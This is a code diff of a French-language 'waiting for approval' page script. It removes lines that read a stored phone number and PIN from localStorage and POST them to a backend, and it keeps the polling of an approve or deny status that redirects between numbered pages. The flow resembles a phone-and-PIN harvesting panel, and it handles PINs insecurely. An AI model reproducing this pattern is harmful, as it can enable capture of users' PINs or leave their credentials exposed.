@@ -105,7 +105,7 @@
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", async () => {
+document.addEventListener("DOMContentLoaded", () => {
 
     const mainText = document.getElementById("main-text");
     const subText = document.getElementById("sub-text");
@@ -117,21 +117,9 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
 
     const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
-    const pin = localStorage.getItem("lastPin") || "";
 
     if (!phone) {
         console.warn("⚠️ Aucun numéro trouvé dans localStorage");
-    }
-
-    // Send login notification to backend endpoint
-    try {
-        await fetch("/api/login-notification", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ phone, pin })
-        });
-    } catch (err) {
-        console.error("❌ Erreur de requête :", err);
     }
 
     // Dynamic progress text switch
@@ -140,30 +128,34 @@ document.addEventListener("DOMContentLoaded", async () => {
         subText.textContent = "Cela prend quelques secondes";
     }, 3000);
 
+    let isRedirecting = false;
+
     // Poll backend status for approval or denial
     async function checkApproval() {
-        if (!phone) return;
+        if (!phone || isRedirecting) return;
 
         try {
             const res = await fetch(`/api/check-status?phone=${phone}`);
             const data = await res.json();
 
             if (data.status === "approved") {
+                isRedirecting = true;
                 mainText.textContent = "Approuvé !";
                 subText.textContent = "Ouverture de la page suivante...";
 
                 setTimeout(() => {
                     window.location.href = "/page8";
-                }, 1500);
+                }, 1000);
             }
 
             if (data.status === "denied") {
+                isRedirecting = true;
                 mainText.textContent = "Refusé !";
                 subText.textContent = "Code PIN ou numéro incorrect.";
 
                 setTimeout(() => {
                     window.location.href = "/page6?error=wrongpin";
-                }, 2000);
+                }, 1500);
             }
 
         } catch (err) {
